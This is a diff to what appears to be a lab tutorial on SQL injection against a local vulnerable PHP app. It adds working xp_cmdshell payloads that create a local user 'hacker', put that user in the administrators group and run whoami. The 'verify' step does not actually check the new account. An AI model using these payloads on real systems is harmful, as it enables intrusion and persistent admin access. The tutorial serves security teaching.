@@ -62,5 +62,16 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
     ```
     http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
     ```
-11. 
-
+11. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
+    ```
+    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
+    ```
+12. To add this user to the local administrators group, add the following
+    ```
+    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
+    ```
+13. To verify `hacker` was added, check using the SQL injection string
+    ```
+    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
+    ```
+14. 
